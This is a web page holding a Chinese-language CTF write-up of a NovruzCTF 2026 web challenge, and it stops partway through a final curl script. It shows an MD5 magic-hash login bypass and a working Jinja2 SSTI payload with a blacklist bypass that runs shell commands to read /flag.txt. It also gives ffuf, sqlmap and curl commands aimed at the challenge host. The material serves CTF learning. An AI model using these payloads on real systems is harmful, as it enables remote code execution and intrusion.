@@ -1,0 +1,1448 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF 竞赛解题记录与学习笔记">
+      
+      
+        <meta name="author" content="BIGC CTF Team">
+      
+      
+        <link rel="canonical" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/Web/NovruzCTF_Novruz_Secret_Keeper/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>NovruzCTF 2026 - Novruz Secret Keeper Writeup - BIGC CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra_v3.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#novruzctf-2026-novruz-secret-keeper-writeup" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="BIGC CTF Writeups" class="md-header__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            BIGC CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NovruzCTF 2026 - Novruz Secret Keeper Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../guides/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  新手指南
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  密码学
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  逆向工程
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Pwn/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pwn
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  杂项
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../PPC/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  PPC
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../events/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  比赛
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../history/competitions/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  历史参赛记录
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  标签
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  模板
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="BIGC CTF Writeups" class="md-nav__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    BIGC CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guides/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    新手指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逆向工程
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂项
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PPC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PPC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    比赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../history/competitions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    历史参赛记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    模板
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解题过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解题过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-md5-magic-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1) 登录绕过（MD5 magic hash + 松散比较）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-sstijinja2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2) 仪表盘发现 SSTI（Jinja2）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3) WAF 黑名单绕过 + 读旗帜
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞与知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        使用的工具
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本归档
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐工具与优化解题流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="推荐工具与优化解题流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具对比总结
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐流程
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        命令行提取关键数据（无 GUI）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="命令行提取关键数据（无 GUI）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1) 登录拿到 Cookie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-url-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2) 生成可复用的 URL 编码 payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3) 发起请求并提取 flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitpy-pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附：仓库中的 exploit.py 说明（独立 Pwn 脚本）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#go-exploitpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Go 版本攻击脚本（与 exploit.py 等价逻辑）
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="novruzctf-2026-novruz-secret-keeper-writeup">NovruzCTF 2026 - Novruz Secret Keeper Writeup<a class="headerlink" href="#novruzctf-2026-novruz-secret-keeper-writeup" title="Permanent link">&para;</a></h1>
+<h2 id="_1">题目信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>比赛</strong>: NovruzCTF 2026</li>
+<li><strong>题目</strong>: Admin Panel（Web）</li>
+<li><strong>附件/URL</strong>: <code>http://103.54.19.209/</code></li>
+<li><strong>题目描述</strong>: 获取 <code>novruzctf{...}</code></li>
+<li><strong>状态</strong>: 已解</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
+</code></pre></div>
+<h2 id="_2">解题过程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1-md5-magic-hash">1) 登录绕过（MD5 magic hash + 松散比较）<a class="headerlink" href="#1-md5-magic-hash" title="Permanent link">&para;</a></h3>
+<p>页面只有登录表单。常规弱口令无果，尝试 SQL 注入也无反应。猜测为 <strong>PHP <code>md5()</code> + <code>==</code> 松散比较</strong>。</p>
+<p>使用经典 “magic hash” 密码：
+- 用户名：<code>admin</code>
+- 密码：<code>240610708</code></p>
+<p>成功进入仪表盘。该密码的 <code>md5()</code> 形如 <code>0e...</code>，在 PHP 松散比较下会被当作科学计数法 0，导致与期望的 <code>0e...</code> 等价。</p>
+<h3 id="2-sstijinja2">2) 仪表盘发现 SSTI（Jinja2）<a class="headerlink" href="#2-sstijinja2" title="Permanent link">&para;</a></h3>
+<p>仪表盘有 <code>Report Title</code> 表单，输入会回显在：
+<div class="highlight"><pre><span></span><code>&lt;h1&gt;Report: {title}&lt;/h1&gt;
+</code></pre></div></p>
+<p>普通 <code>{{7*7}}</code> 被过滤，但加入换行可绕过：
+<div class="highlight"><pre><span></span><code>{{
+7*7
+}}
+</code></pre></div>
+回显 <code>49</code>，确认 <strong>Jinja2 SSTI</strong>。</p>
+<h3 id="3-waf">3) WAF 黑名单绕过 + 读旗帜<a class="headerlink" href="#3-waf" title="Permanent link">&para;</a></h3>
+<p>直接使用 <code>__class__ / __init__ / __globals__</code> 会触发 “Hacking attempt detected!”。采用字符串拼接绕过黑名单：
+- 使用 <code>"_"*2</code> 构造 <code>__</code>
+- 使用 <code>attr()</code> 访问属性</p>
+<p>读取根目录验证：
+<div class="highlight"><pre><span></span><code>{{
+((cycler|attr(&quot;_&quot;*2 ~ &quot;init&quot; ~ &quot;_&quot;*2)|attr(&quot;_&quot;*2 ~ &quot;globals&quot; ~ &quot;_&quot;*2))[&quot;os&quot;]).popen(&quot;ls /&quot;).read()
+}}
+</code></pre></div>
+看到 <code>/flag.txt</code> 后读取：
+<div class="highlight"><pre><span></span><code>{{
+((cycler|attr(&quot;_&quot;*2 ~ &quot;init&quot; ~ &quot;_&quot;*2)|attr(&quot;_&quot;*2 ~ &quot;globals&quot; ~ &quot;_&quot;*2))[&quot;os&quot;]).popen(&quot;cat /flag.txt&quot;).read()
+}}
+</code></pre></div>
+得到旗帜。</p>
+<h2 id="_3">漏洞与知识点<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>MD5 magic hash + PHP 松散比较</strong>：<code>md5()</code> 结果形如 <code>0e...</code> 会被当作数值 0，导致错误等价判断。</li>
+<li><strong>Jinja2 SSTI</strong>：模板未做安全渲染，且过滤规则可被换行绕过。</li>
+<li><strong>黑名单绕过</strong>：用字符串拼接 + <code>attr()</code> 构造 dunder 属性，绕开关键词过滤。</li>
+</ol>
+<h2 id="_4">知识点<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>MD5 magic hash</strong> — <code>0e...</code> 字符串在松散比较中等价为 0</li>
+<li><strong>Jinja2 SSTI</strong> — 模板执行上下文可被滥用</li>
+<li><strong>黑名单绕过</strong> — 字符拼接与 <code>attr()</code> 规避关键字过滤</li>
+</ul>
+<h2 id="_5">使用的工具<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<ul>
+<li>浏览器/请求重放（手工或 Burp/Playwright）</li>
+<li>命令行 <code>curl</code> / <code>python</code> 辅助验证与提取</li>
+</ul>
+<h2 id="_6">脚本归档<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Go：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/NovruzCTF_Novruz_Secret_Keeper.go" target="_blank"><code>NovruzCTF_Novruz_Secret_Keeper.go</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+<li>Python：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/NovruzCTF_Novruz_Secret_Keeper.py" target="_blank"><code>NovruzCTF_Novruz_Secret_Keeper.py</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+</ul>
+<h2 id="_7">推荐工具与优化解题流程<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>根据扩展计划，Web 题优先使用现成工具，Crypto 用自研工具包：</p>
+<p>1) <strong>目录与端点发现（Web）</strong> — <code>ffuf</code>
+<div class="highlight"><pre><span></span><code>ffuf -u http://103.54.19.209/FUZZ -w /path/to/wordlist.txt -fc 404
+</code></pre></div>
+用于快速发现 <code>dashboard.php</code> 等隐藏页面。</p>
+<p>2) <strong>请求重放与调试（Web）</strong> — <code>Burp Suite</code>
+- 抓取登录与仪表盘请求
+- 在 Repeater 中批量测试 <code>{{...}}</code>、换行绕过、黑名单绕过等 payload</p>
+<p>3) <strong>注入排查（Web）</strong> — <code>SQLMap</code>（可选）
+<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://103.54.19.209/&quot; --data &quot;login=admin&amp;pwd=test&quot; --batch
+</code></pre></div>
+快速排除 SQL 注入方向，节省时间。</p>
+<p>4) <strong>MD5 验证（Crypto，自研工具包）</strong> — <code>ctf_tools/crypto</code>
+<div class="highlight"><pre><span></span><code>cd ctf_tools/crypto
+# 构建后使用 hash 子命令验证 magic hash
+./crypto_toolkit hash -a md5 -t &quot;240610708&quot;
+</code></pre></div>
+快速验证 <code>md5()</code> 是否呈现 <code>0e...</code> 形式。</p>
+<h3 id="_8">工具对比总结<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>适用阶段</th>
+<th>本题耗时</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>ffuf</strong></td>
+<td>目录/端点发现</td>
+<td>~2 分钟</td>
+<td>自动化发现页面</td>
+<td>需要字典</td>
+</tr>
+<tr>
+<td><strong>Burp Suite</strong></td>
+<td>交互与调试</td>
+<td>~5 分钟</td>
+<td>Repeater 迭代快</td>
+<td>需要 GUI</td>
+</tr>
+<tr>
+<td><strong>SQLMap</strong></td>
+<td>注入排查</td>
+<td>~3 分钟</td>
+<td>快速排除 SQLi</td>
+<td>误报时需手动确认</td>
+</tr>
+<tr>
+<td><strong>ctf_tools/crypto</strong></td>
+<td>MD5 验证</td>
+<td>~1 分钟</td>
+<td>本地快速校验</td>
+<td>需先构建工具</td>
+</tr>
+<tr>
+<td><strong>curl</strong></td>
+<td>纯命令行</td>
+<td>~5 分钟</td>
+<td>无 GUI 依赖</td>
+<td>交互性较弱</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_9">推荐流程<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p><strong>推荐流程</strong>：ffuf 发现入口 → Burp 复现与测试 SSTI → ctf_tools/crypto 验证 magic hash → curl 自动化提取 → 5-10 分钟完成。</p>
+<h2 id="gui">命令行提取关键数据（无 GUI）<a class="headerlink" href="#gui" title="Permanent link">&para;</a></h2>
+<h3 id="1-cookie">1) 登录拿到 Cookie<a class="headerlink" href="#1-cookie" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>curl -i -s -c cookies.txt \
+  -d &quot;login=admin&amp;pwd=240610708&quot; \
+  http://103.54.19.209/
+</code></pre></div>
+<h3 id="2-url-payload">2) 生成可复用的 URL 编码 payload<a class="headerlink" href="#2-url-payload" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>python - &lt;&lt;&#39;PY&#39;
+import urllib.parse
+payload = &quot;&quot;&quot;{{
+((cycler|attr(&quot;_&quot;*2 ~ &quot;init&quot; ~ &quot;_&quot;*2)|attr(&quot;_&quot;*2 ~ &quot;globals&quot; ~ &quot;_&quot;*2))[&quot;os&quot;]).popen(&quot;cat /flag.txt&quot;).read()
+}}&quot;&quot;&quot;
+print(urllib.parse.urlencode({&quot;title&quot;: payload}))
+PY
+</code></pre></div>
+<h3 id="3-flag">3) 发起请求并提取 flag<a class="headerlink" href="#3-flag" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>curl -s -b cookies.txt \
+  -d &quot;$(python - &lt;&lt;&#39;PY&#39;
+import urllib.parse
+payload = &quot;&quot;&quot;{{
+((cycler|attr(&quot;_&quot;*2 ~ &quot;init&quot; ~ &quot;_&quot;*2)|attr(&quot;_&quot;*2 ~ &quot;globals&quot; ~ &quot;_&quot;*2))[&quot;os&quot;]).popen(&quot;cat /flag.txt&quot;).read()
+}}&quot;&quot;&quot;
